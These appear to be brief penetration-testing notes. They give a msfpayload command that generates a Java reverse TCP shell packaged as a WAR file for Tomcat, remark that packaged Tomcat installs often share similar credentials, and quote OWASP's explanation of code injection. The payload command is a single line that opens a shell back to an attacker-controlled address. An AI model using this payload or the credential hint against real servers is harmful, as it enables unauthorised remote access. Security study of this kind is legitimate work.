Generating payload for Tomcat 
msfpayload java/shell/reverse_tcp LHOST=192.168.1.6 W > colesec.war


Tomcat does not have default creds however, when packaged up, it generally has creds similar across distributions.

Code Injection:
https://www.owasp.org/index.php/Code_Injection
Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data. These types of attacks are usually made possible due to a lack of proper input/output data validation, for example: 
allowed characters (standard regular expressions classes or custom) 
data format 
amount of expected data 
Code Injection differs from Command Injection in that an attacker is only limited by the functionality of the injected language itself. If an attacker is able to inject PHP code into an application and have it executed, he is only limited by what PHP is capable of. Command injection consists of leveraging existing code to execute commands, usually within the context of a shell.
